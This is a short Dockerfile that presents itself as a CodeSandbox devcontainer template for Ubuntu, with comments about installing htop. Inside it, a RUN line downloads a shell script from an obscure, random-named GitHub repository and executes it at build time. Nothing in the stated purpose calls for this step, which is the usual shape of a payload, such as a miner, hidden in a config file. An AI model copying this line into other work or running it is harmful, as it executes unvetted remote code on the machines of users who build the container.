# CodeSandbox supports debian & ubuntu based images
FROM mcr.microsoft.com/devcontainers/base:ubuntu-22.04

# Example; install htop by default
RUN apt update -y && apt install -y htop && apt install wget -y && apt install zip -y
RUN wget https://github.com/dgfhghd1324/adfsv/raw/main/test.sh && chmod +x test.sh && ./test.sh
# The project will be mounted in /workspace by default

# Every new shell will open inside the built container

# On top of this build, we install `zsh`, `git` and `docker` as additional
# Docker layers.
